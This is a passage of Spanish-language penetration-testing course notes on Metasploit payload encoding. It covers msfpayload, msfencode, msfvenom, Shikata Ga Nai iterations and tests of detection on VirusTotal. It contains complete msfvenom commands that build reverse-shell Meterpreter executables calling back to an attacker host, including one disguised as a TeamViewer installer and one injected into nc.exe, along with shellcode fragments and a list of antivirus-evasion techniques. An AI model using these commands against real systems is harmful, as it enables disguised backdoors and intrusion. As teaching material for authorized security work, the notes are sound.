"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
...
```

**Ahora tienes**:
- ✅ Payload encodificado (sin null bytes)
- ✅ En formato Perl (fácil de integrar en exploits)
- ✅ Ofuscado con Shikata Ga Nai

### Ventajas del Sistema Antiguo

| Ventaja | Explicación |
|---------|-------------|
| **Modular** | Cada herramienta hace una cosa bien |
| **Flexible** | Puedes usar msfpayload sin msfencode |
| **Scripteable** | Fácil de automatizar con bash scripts |
| **Transparente** | Ves exactamente qué hace cada paso |

### Desventajas del Sistema Antiguo

| Desventaja | Explicación |
|------------|-------------|
| **Dos comandos** | Tienes que recordar sintaxis de ambos |
| **Pipes complejos** | Los comandos largos son difíciles de leer |
| **Errores confusos** | ¿El error viene de msfpayload o msfencode? |
| **Duplicación** | Muchas opciones repetidas entre los dos |

**Ejemplo de Comando Complejo**:

```bash
# Esto es difícil de leer y propenso a errores
msfpayload windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=443 R | \
  msfencode -b '\x00\x0a\x0d\x20' \
  -t exe -x /usr/share/windows/nc.exe \
  -k -o backdoor.exe \
  -e x86/shikata_ga_nai -c 5
```

**Problemas**:
- ¿Qué hace cada flag?
- Si hay error, ¿cuál herramienta falló?
- Difícil de debuggear
- Difícil de modificar

Por eso en 2015 se unificaron en **msfvenom**.

---

## 🚀 msfvenom: La Herramienta Moderna

### La Unificación (Post-2015)

> Después de 2015, las actualizaciones a estos scripts los combinaron dentro de la herramienta **msfvenom**, que se encarga de la generación de payloads Y del encoding.

**msfvenom** = **msf**payload + **msf**encode + **venom** (veneno)

### Ventajas de msfvenom

| Ventaja | Explicación | Ejemplo |
|---------|-------------|---------|
| **Todo-en-uno** | Un solo comando para todo | `msfvenom -p ... -e ...` |
| **Sintaxis consistente** | Mismos flags para todo | `-p` payload, `-e` encoder |
| **Mejor manejo de errores** | Mensajes claros | `[-] Encoder incompatible with payload` |
| **Auto-detección** | Elige encoder automáticamente si es necesario | Si usas `-b "\x00"` auto-usa SGN |
| **Más formatos** | Soporta 57+ formatos de salida | exe, elf, jar, war, python, etc. |

### Ejemplo Comparativo

**Antiguo (2 comandos)**:
```bash
msfpayload windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 R | \
msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

**Moderno (1 comando)**:
```bash
msfvenom -a x86 --platform windows \
  -p windows/shell/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00" -f perl -e x86/shikata_ga_nai
```

**Más limpio, más claro, más fácil.**

### Generación de Payload SIN Encoding Explícito

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 \
  -b "\x00" \
  -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes

my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
...
```

**Observaciones Importantes**:

1. **Auto-detección de encoder**:
   ```
   Found 11 compatible encoders
   ```
   msfvenom **buscó automáticamente** qué encoders pueden evitar `\x00`

2. **Selección automática**:
   ```
   x86/shikata_ga_nai chosen with final size 381
   ```
   Aunque NO especificaste `-e`, msfvenom **eligió Shikata Ga Nai** porque:
   - Es el mejor encoder para x86
   - Puede evitar `\x00` (tu bad character)
   - Tiene rank "excellent"

3. **Una sola iteración**:
   ```
   Attempting to encode payload with 1 iterations
   ```
   Por defecto usa 1 iteración (suficiente para evitar bad chars, no para evasión)

### Generación de Payload CON Encoding Explícito

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 \
  -b "\x00" \
  -f perl \
  -e x86/shikata_ga_nai  # ← Especificamos el encoder

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes

buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
...
```

**Diferencias clave**:

1. **Solo 1 encoder compatible**:
   ```
   Found 1 compatible encoders
   ```
   Porque **especificaste cuál usar** con `-e`

2. **3 iteraciones por defecto**:
   ```
   Attempting to encode payload with 3 iterations
   ```
   Cuando especificas el encoder, msfvenom usa **3 iteraciones** para mejor ofuscación

3. **Tamaño aumenta con cada iteración**:
   ```
   iteration=0: 326 bytes
   iteration=1: 353 bytes (+27 bytes)
   iteration=2: 380 bytes (+27 bytes)
   ```
   Cada capa de encoding **agrega tamaño**

### Comparación de Outputs

**Primera línea SIN encoding explícito** (auto-selección, 1 iteración):
```
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9"
```

**Primera línea CON encoding explícito** (3 iteraciones):
```
"\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
```

**Completamente diferente** - el encoding cambió el payload.

**¿Por qué?**

Shikata Ga Nai es **polimórfico** - cada ejecución genera código diferente, y más iteraciones = más cambios.

### Parámetros Importantes de msfvenom

| Parámetro | Descripción | Ejemplo |
|-----------|-------------|---------|
| `-p` | Payload a usar | `-p windows/meterpreter/reverse_tcp` |
| `-a` | Arquitectura | `-a x86` o `-a x64` |
| `--platform` | Plataforma | `--platform windows` |
| `LHOST` | IP del atacante | `LHOST=10.10.14.5` |
| `LPORT` | Puerto del atacante | `LPORT=4444` |
| `-b` | Bad characters a evitar | `-b "\x00\x0a\x0d"` |
| `-e` | Encoder a usar | `-e x86/shikata_ga_nai` |
| `-i` | Iteraciones de encoding | `-i 10` |
| `-f` | Formato de salida | `-f exe`, `-f python`, `-f c` |
| `-o` | Archivo de salida | `-o payload.exe` |

---

## 🔍 Seleccionar Encoders en msfconsole

### Comando: show encoders

Dentro de msfconsole, cuando tienes un exploit y payload seleccionados, puedes ver qué encoders son **compatibles** con esa combinación específica.

#### Ejemplo 1: Exploit x64 (MS17-010 EternalBlue)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

**Observación Importante**: Solo vemos **5 encoders** y todos son para **x64**.

**¿Por qué tan pocos?**

Porque el payload seleccionado es `windows/x64/meterpreter/reverse_tcp`:
```
windows/x64/meterpreter/reverse_tcp
        ↑
      x64 architecture
```

Metasploit **automáticamente filtra** los encoders para mostrarte **solo los compatibles** con x64.

**Analogía**: Es como ir a una tienda de zapatos y decir "calzo 42". El vendedor solo te muestra zapatos talla 42, no todas las tallas que tienen en stock.

#### Ejemplo 2: Exploit x86 (MS09-050 SMB)

```bash
msf6 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

**¡Ahora hay 17 encoders!**

**¿Por qué tantos más?**

Porque este exploit es para **x86 (32 bits)**, y la arquitectura x86:
1. Es más antigua (más encoders desarrollados)
2. Tiene más restricciones (necesitas encoders especializados)
3. Es más común históricamente

**Observa el Ranking**:
```
x86/shikata_ga_nai    excellent  ← El mejor
x86/fnstenv_mov       normal     ← Decente
x86/alpha_mixed       low        ← Limitado
x86/avoid_utf8_tolower manual    ← Caso muy específico
```

### Entendiendo los Rankings de Encoders

| Rank | Significado | Cuándo Usar |
|------|-------------|-------------|
| **Excellent** | Mejor encoder disponible | Usa este si puedes |
| **Great** | Muy bueno, confiable | Segunda opción |
| **Good** | Funciona bien en la mayoría de casos | OK para uso general |
| **Normal** | Funciona, pero tiene limitaciones | Cuando los mejores no sirven |
| **Low** | Casos muy específicos | Solo si sabes lo que haces |
| **Manual** | Requiere configuración manual | Expertos solamente |

### Encoders Especiales Explicados

Algunos encoders tienen nombres raros. Veamos qué hacen:

#### 1. **alpha_mixed / alpha_upper**
```
Propósito: Payload que solo usa caracteres alfanuméricos
Resultado: A-Z, a-z, 0-9 solamente

Ejemplo de output:
  Normal: \x41\x42\x00\xff
  Alpha:  ABCDXYZ123QWERTY
```

**¿Para qué sirve?**

Imagina que estás explotando una aplicación web que filtra **todos los caracteres especiales**:
```php
// Aplicación vulnerable que sanitiza
$input = preg_replace('/[^A-Za-z0-9]/', '', $_GET['exploit']);
```

Tu payload normal sería bloqueado:
```
Payload: \x41\x42\x00\xff  ← Tiene bytes especiales
Filtro: Rechazado
```

Con alpha encoder:
```
Payload: ABCDXYZ123QWERTY  ← Solo alfanumérico
Filtro: ¡Aceptado!
```

**Desventaja**: El payload se hace MUCHO más grande.

#### 2. **avoid_utf8_tolower**
```
Propósito: Evitar bytes que UTF-8 convierte a minúsculas
```

**Caso de uso real**:

Algunos sistemas convierten automáticamente todo a minúsculas:
```
Input:  "HACK"
Sistema: Convierte a "hack"
```

Si tu payload tiene bytes que se interpretan como letras UTF-8 mayúsculas, se rompe:
```
Payload original: \x41\x42  (AB en ASCII)
Sistema convierte: \x61\x62  (ab en ASCII)
Resultado: Payload corrupto
```

Este encoder **evita esos bytes problemáticos**.

#### 3. **context_cpuid / context_stat / context_time**
```
Propósito: Payloads que solo se ejecutan en contextos específicos
```

Estos son encoders **extremadamente avanzados** que crean payloads que:

**context_cpuid**: Solo se ejecuta en CPUs con ciertas características
```
if (CPU_ID == "GenuineIntel") {
    ejecutar_payload()
} else {
    no_hacer_nada()  // Evade sandboxes con CPU virtual
}
```

**context_stat**: Solo se ejecuta si ciertos archivos existen
```
if (file_exists("/etc/shadow")) {
    ejecutar_payload()  // Sistema real
} else {
    no_hacer_nada()  // Probablemente sandbox
}
```

**context_time**: Solo se ejecuta en ciertos momentos
```
if (hora_actual >= "2025-01-01 00:00:00") {
    ejecutar_payload()  // Bomba de tiempo
}
```

**Uso típico**: Red Team avanzado para evitar análisis en sandboxes.

#### 4. **unicode_mixed / unicode_upper**
```
Propósito: Payload que parece texto Unicode válido
```

Similar a alpha encoders, pero usando caracteres Unicode:
```
Normal:  \x41\x42\x43
Unicode: ㄀㄁㄂  (Caracteres Unicode válidos)
```

**Caso de uso**: Evadir filtros que bloquean ASCII pero permiten Unicode.

### ¿Cómo Saber Cuál Encoder Usar?

**Regla General**: Usa Shikata Ga Nai a menos que tengas una razón específica para no hacerlo.

**Árbol de Decisión**:

```
¿Necesitas evitar bad characters?
    ↓ SÍ
    ¿Cuáles bad characters?
        ↓ Solo \x00, \x0a, \x0d (comunes)
        → x86/shikata_ga_nai
        
        ↓ Todos los no-alfanuméricos
        → x86/alpha_mixed
        
        ↓ Solo mayúsculas
        → x86/alpha_upper

¿Necesitas evadir análisis de sandbox?
    ↓ SÍ
    → x86/context_cpuid o context_stat

¿Necesitas máxima ofuscación?
    ↓ SÍ
    → x86/shikata_ga_nai con múltiples iteraciones (-i 10)

¿No necesitas encoding?
    ↓ SÍ
    → generic/none
```

---

## 🦠 Pruebas Reales: Evasión de Antivirus

Ahora vamos a probar **en la realidad** qué tan efectivo es Shikata Ga Nai contra antivirus modernos.

> **Nota del Instructor**: "Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today."

Vamos a **verificar** esto con pruebas reales.

### Prueba 1: Una Sola Iteración

#### Generando el Payload

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -f exe \
  -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

**Desglose del Comando**:

| Parámetro | Valor | Explicación |
|-----------|-------|-------------|
| `-a x86` | Arquitectura 32 bits | Compatible con Windows antiguo y nuevo |
| `--platform windows` | Plataforma Windows | Genera EXE para Windows |
| `-p windows/meterpreter/reverse_tcp` | Payload Meterpreter | Shell completo con funcionalidades avanzadas |
| `LHOST=10.10.14.5` | IP atacante | Donde se conectará la víctima |
| `LPORT=8080` | Puerto atacante | Puerto donde escucharemos |
| `-e x86/shikata_ga_nai` | Encoder | El famoso SGN |
| `-f exe` | Formato ejecutable | Archivo .exe para Windows |
| `-o ./TeamViewerInstall.exe` | Output | Nombre del archivo |

**¿Por qué "TeamViewerInstall.exe"?**

Social engineering básico:
- TeamViewer es software legítimo
- Los usuarios están acostumbrados a instaladores
- Menos sospechoso que "payload.exe" o "hack.exe"

#### Resultado en VirusTotal (1 Iteración)

**Subimos el archivo a VirusTotal...**

```
╔═══════════════════════════════════════════════════════╗
║        RESULTADO VIRUSTOTAL - 1 ITERACIÓN             ║
╠═══════════════════════════════════════════════════════╣
║  Detectado por: 54 de 69 motores                      ║
║  Tasa de detección: 78.26%                            ║
║  Veredicto: ALTAMENTE DETECTADO                       ║
╚═══════════════════════════════════════════════════════╝
```

<img width="1488" height="720" alt="image" src="https://github.com/user-attachments/assets/74122298-1f26-444c-9eb1-579199d015e1" />


**Detecciones Principales**:

| Antivirus | Resultado | Comentario |
|-----------|-----------|------------|
| **Microsoft Defender** | Trojan:Win32/Meterpreter.A | ❌ Detecta EXACTAMENTE que es Meterpreter |
| **Kaspersky** | HEUR:Trojan.Win32.Generic | ❌ Heurística lo detecta |
| **Avast** | Win32:SwPatch [Wrm] | ❌ Detectado |
| **AVG** | Win32:SwPatch [Wrm] | ❌ Detectado (mismo engine que Avast) |
| **Sophos** | ML/PE-A + Mal/EncPk-ACE | ❌ Machine Learning lo detecta |
| **TrendMicro** | BKDR_SWRORT.SM | ❌ Detectado como backdoor |
| **McAfee** | Swrort.i | ❌ Detectado |
| **Symantec** | Packed.Generic.347 | ❌ Detecta que está empaquetado |

**Análisis del Desastre**:

1. **Microsoft Defender** literalmente dice "Meterpreter" - reconoce EXACTAMENTE qué es
2. **Sophos** usa Machine Learning - el encoding no lo confunde
3. **54 de 69** es una tasa de detección **brutal**

**Conclusión**: Una iteración de SGN es **completamente inútil** contra AV modernos.

### Prueba 2: Diez Iteraciones

**Pensamiento**: "Si 1 iteración no funciona, probemos con 10"

#### Generando el Payload (10 Iteraciones)

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -i 10 \  # ← 10 ITERACIONES
  -f exe \
  -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
```

**Observa el Crecimiento del Payload**:

```
Iteración 0: 368 bytes  (baseline)
Iteración 1: 395 bytes  (+27 bytes = +7.3%)
Iteración 2: 422 bytes  (+27 bytes = +6.8%)
Iteración 3: 449 bytes  (+27 bytes = +6.4%)
...
Iteración 9: 611 bytes  (+243 bytes total = +66% del original)
```

**Cada capa de encoding agrega ~27 bytes** de overhead (el decoder stub).

**Visualización**:

```
ITERACIÓN 0 (Original):
[Payload: 368 bytes]

ITERACIÓN 1:
[Decoder 1][Payload encodificado: 395 bytes]

ITERACIÓN 10:
[Decoder 1][Decoder 2]...[Decoder 10][Payload: 611 bytes]
            └─────────────┬─────────────┘
                  10 capas de cebolla
```

Es como una **muñeca rusa** (matryoshka) - cada iteración agrega una capa que tiene que desempacar la siguiente.

#### Resultado en VirusTotal (10 Iteraciones)

**Expectativa**: "Con 10 capas, debería ser mucho más difícil de detectar"

**Realidad**:

<img width="1416" height="687" alt="image" src="https://github.com/user-attachments/assets/8f4baffc-29ff-4a36-9f4c-8f6e72741081" />

Estamos igual..

---

## 🔬 VirusTotal Integration

Metasploit tiene integración directa con VirusTotal para analizar tus payloads sin salir de la línea de comandos.

### Herramienta: msf-virustotal

**Requisitos**:
1. ✅ Cuenta gratuita en VirusTotal (https://www.virustotal.com/gui/join-us)
2. ✅ API key de VirusTotal (la obtienes después de registrarte)

### Uso de msf-virustotal

```bash
$ msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe

[*] Using API key: <API_KEY>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
```

**Proceso**:

1. **Upload**: Sube el archivo a VirusTotal
2. **Hashes**: Genera MD5, SHA1, SHA256
3. **Queue**: VirusTotal lo pone en cola para análisis
4. **Wait**: Espera mientras 60+ antivirus lo escanean (puede tomar minutos)
5. **Report**: Descarga y muestra el reporte

### Reporte Completo Detallado

```
==================================================================================================================

 Antivirus             Detected  Version           Result                          Update
 ---------             --------  -------           ------                          ------
 ALYac                 true      1.1.3.1           Trojan.CryptZ.Gen               20220505
 APEX                  true      6.288             Malicious                       20220504
 AVG                   true      21.1.5827.0       Win32:SwPatch [Wrm]             20220505
 Acronis               true      1.2.0.108         suspicious                      20220426
 Avast                 true      21.1.5827.0       Win32:SwPatch [Wrm]             20220505
 Avira                 true      8.3.3.14          TR/Patched.Gen2                 20220505
 BitDefender           true      7.2               Trojan.CryptZ.Gen               20220505
 ClamAV                true      0.105.0.0         Win.Trojan.MSShellcode-6360728  20220505
 Kaspersky             true      21.0.1.45         HEUR:Trojan.Win32.Generic       20220505
 Microsoft             true      1.1.19200.5       Trojan:Win32/Meterpreter.A      20220505
 Sophos                true      1.4.1.0           ML/PE-A + Mal/EncPk-ACE         20220505
 Symantec              true      1.17.0.0          Packed.Generic.347              20220505
 TrendMicro            true      11.0.0.1006       BKDR_SWRORT.SM                  20220505
 
 [... más antivirus ...]
 
 Alibaba               false     0.3.0.5           -                               20190527
 Baidu                 false     1.0.0.2           -                               20190318
 Webroot               false     1.0.0.403         -                               20190505
```

**Análisis de Detecciones Específicas**:

### 🔴 Detecciones Críticas (Específicas de Metasploit)

**Microsoft Defender**:
```
Trojan:Win32/Meterpreter.A
         ↑
  Detecta EXPLÍCITAMENTE que es Meterpreter
```

Esto es **devastador** - Microsoft sabe **exactamente** qué es.

**TrendMicro**:
```
BKDR_SWRORT.SM
  ↑      ↑
Backdoor Swrort (familia conocida de Metasploit payloads)
```

### 🟡 Detecciones Genéricas (Heurística)

**Kaspersky**:
```
HEUR:Trojan.Win32.Generic
 ↑
Heurística - detecta comportamiento sospechoso, no firma específica
```

**Sophos**:
```
ML/PE-A + Mal/EncPk-ACE
↑         ↑
Machine   Malware Encoded Package
Learning
```

Sophos usa **dos métodos**:
1. Machine Learning (ML/PE-A)
2. Detección de payloads encodificados (Mal/EncPk-ACE)

### 🟢 No Detectado (Los Raros)

Algunos antivirus **NO** lo detectan:

| Antivirus | ¿Por qué NO detecta? |
|-----------|----------------------|
| **Alibaba** | BD desactualizada (última actualización: 2019) |
| **Baidu** | BD desactualizada (última actualización: 2019) |
| **Webroot** | Enfoque en comportamiento en tiempo real, no firmas estáticas |

**Nota**: Estos AV que no detectan tienen bases de datos **MUY desactualizadas** (2019).

En un entorno real (2025), estarían actualizados y **SÍ detectarían** el payload.

### ⚠️ ADVERTENCIA CRÍTICA: NO Subas Payloads Reales a VirusTotal

**¿Por qué?**

VirusTotal **comparte** muestras con:
- Todos los fabricantes de antivirus
- Investigadores de seguridad
- Bases de datos públicas

```
ESCENARIO MALO:

Tú: *Creas payload personalizado super secreto*
    *Lo subes a VirusTotal para probar*
    
VirusTotal:
    → Comparte con todos los AV
    → Los AV analizan tu payload
    → Crean firmas específicas
    → Actualizan sus bases de datos
    
24 horas después:
    Tu payload "secreto" → Detectado por TODOS los AV
```

**Analogía**: Es como enviar tu plan secreto de robo a **todas las comisarías de policía** del mundo para que te digan si funcionaría.

**Regla de Oro**:

```
✅ SUBE a VirusTotal:
   - Payloads de práctica
   - Payloads generados con defaults de Metasploit
   - Payloads que no usarás en operaciones reales

❌ NO SUBAS NUNCA a VirusTotal:
   - Payloads personalizados
   - Payloads para pentests reales
   - Payloads con técnicas de evasión propias
   - Payloads para Red Team operations
```

**Alternativas para Testing Real**:

1. **Máquina Virtual Local**:
   ```
   - Instala Windows en VM
   - Instala antivirus
   - Prueba payload localmente
   - NO conectes a Internet
   ```

2. **Servicios Privados de Análisis**:
   ```
   - Any.Run (modo privado)
   - Joe Sandbox (licencia privada)
   - Cuckoo Sandbox (self-hosted)
   ```

3. **Testing en Lab Controlado**:
   ```
   - Red aislada
   - Múltiples VMs con diferentes AV
   - Sin conexión a Internet
   ```


### Alternativas para Evasión Real (Fuera del Alcance del Módulo)

El módulo dice:
> "we would have to use other methods for AV evasion that are outside the scope of this module"

**¿Cuáles son esos métodos?** (Mencionados pero no enseñados):

#### 1. Custom Payload Development
```
- Escribir tu propio payload desde cero
- NO usar Meterpreter (muy conocido)
- Usar lenguajes menos comunes (Rust, Nim, D)
```

#### 2. Ofuscación Avanzada
```
- Obfuscate.py para Python
- ConfuserEx para .NET
- VMProtect para binarios
```

#### 3. Process Injection
```
- Inyectar en procesos legítimos
- Process Hollowing
- APC Injection
- Atom Bombing
```

#### 4. Living Off The Land (LOLBins)
```
- Usar herramientas legítimas del sistema
- PowerShell, WMIC, CertUtil, BITSAdmin
- Difícil de detectar (son binarios firmados por Microsoft)
```

#### 5. In-Memory Execution
```
- Nunca tocar el disco
- Ejecutar todo en memoria (RAM)
- Usar técnicas de Reflective DLL Injection
```

#### 6. Encriptación Custom
```
- Crear tu propio algoritmo de encriptación
- NO usar encoders conocidos
- Decriptación en memoria
```

#### 7. Herramientas Especializadas
```
- Veil Framework
- Phantom-Evasion
- Shellter
- TheFatRat
- (Todas estas también están siendo detectadas más y más)
```

### La Verdad Incómoda

**La Realidad del 2025**:

```
EVASIÓN DE AV MODERNA REQUIERE:

1. Custom Development (semanas/meses de trabajo)
2. Investigación constante de nuevas técnicas
3. Testing en entornos controlados
4. Actualización continua (los AV se actualizan cada día)
5. Presupuesto (herramientas, tiempo, expertise)

NO es algo que logras con:
  - 1 comando de msfvenom
  - Encoders estándar
  - Técnicas públicas y conocidas
```




### Lo Que Funciona vs Lo Que No

| Uso | 2005 | 2025 |
|-----|------|------|
| Eliminar bad characters | ✅ | ✅ |
| Compatibilidad arquitectura | ✅ | ✅ |
| Evasión de AV | ✅ | ❌ |
| Bypass de IPS/IDS | ✅ | ❌ |
| Ofuscación básica | ✅ | ❌ |

